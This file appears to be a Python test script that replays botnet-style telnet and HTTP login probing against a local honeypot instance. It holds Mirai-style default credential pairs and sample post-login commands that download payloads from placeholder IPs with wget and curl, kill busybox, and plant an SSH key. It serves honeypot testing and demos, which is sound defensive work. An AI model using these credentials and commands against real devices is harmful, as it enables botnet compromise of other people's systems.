#!/usr/bin/env python3
"""Replays typical botnet-style probing against a LOCAL pitfall instance (for demos/tests)."""
import random
import socket
import sys
import time
import urllib.parse

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
TELNET, HTTP = 2323, 8080
CREDS = [("root", "xc3511"), ("admin", "admin"), ("root", "vizxv"), ("admin", "1234"),
         ("root", "root"), ("user", "user"), ("support", "support"), ("root", "12345")]
SCRIPTS = [
    ["uname -a", "cat /proc/cpuinfo", "wget http://203.0.113.9/bins.sh", "exit"],
    ["whoami", "id", "curl -O http://198.51.100.7/x86", "pkill busybox", "exit"],
    ["ls", "echo ssh-rsa AAA >> authorized_keys", "exit"],
]


def telnet_session():
    s = socket.create_connection((HOST, TELNET), timeout=5)
    f = s.makefile("rwb", buffering=0)
    for u, p in [random.choice(CREDS), random.choice(CREDS)]:
        s.recv(256)
        f.write(f"{u}\n".encode())
        s.recv(256)
        f.write(f"{p}\n".encode())
        time.sleep(0.05)
    for cmd in random.choice(SCRIPTS):
        time.sleep(0.05)
        s.recv(4096)
        f.write(f"{cmd}\n".encode())
    s.close()


def http_session():
    u, p = random.choice(CREDS)
    body = urllib.parse.urlencode({"username": u, "password": p})
    s = socket.create_connection((HOST, HTTP), timeout=5)
    s.sendall((f"POST /login HTTP/1.1\r\nHost: x\r\nUser-Agent: Mozilla/5.0 zgrab\r\n"
               f"Content-Length: {len(body)}\r\n\r\n{body}").encode())
    s.recv(4096)
    s.close()


for _ in range(int(sys.argv[2]) if len(sys.argv) > 2 else 20):
    random.choice([telnet_session, telnet_session, http_session])()
print("done")
